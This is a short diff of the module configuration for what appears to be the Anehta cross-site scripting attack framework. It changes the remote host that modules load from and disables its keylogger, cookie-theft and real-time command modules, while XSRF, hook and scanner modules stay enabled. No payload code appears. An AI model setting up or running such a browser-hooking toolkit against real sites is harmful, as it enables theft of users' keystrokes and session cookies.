@@ -3,11 +3,11 @@
 //alert("feed.js 种子");
 
 // anehta files url
-var anehtaurl = "http://www.secwiki.com/anehta";
+var anehtaurl = "http://www.a.com/anehta";
 
 var anehtaFeeds = [
   // Library
-  {name: "BaseLib", url: "/library/base.js"},
+  {name: "AnehtaLib", url: "/library/anehta.js"},
   {name: "JqueryLib", url: "/library/jquery.js"},
   
   // Modules
@@ -16,11 +16,11 @@ var anehtaFeeds = [
   {name: "XsrfMod", url: "/module/xsrf.js"},
   //{name: "DdosMod", url: "/module/ddos.js"},
   {name: "HookMod", url: "/module/hook.js"},
-  {name: "KeyloggerMod", url: "/module/keylog.js"},
-  {name: "XCookieMod", url: "/module/xcookie.js"},
+  //{name: "KeyloggerMod", url: "/module/keylog.js"},
+  //{name: "XCookieMod", url: "/module/xcookie.js"},
   //{name: "CookieDemoMod", url: "/module/demo/cookieDemo.js"},
   //{name: "CacheDemoMod", url: "/module/demo/cacheDemo.js"},
-  {name: "RealtimeCmdMod", url: "/module/realtimecmd.js"},
+  //{name: "RealtimeCmdMod", url: "/module/realtimecmd.js"},
   {name: "ScannerMod", url: "/module/scanner.js"},
   {name: "TestMod", url: "/module/test.js"}
 ];
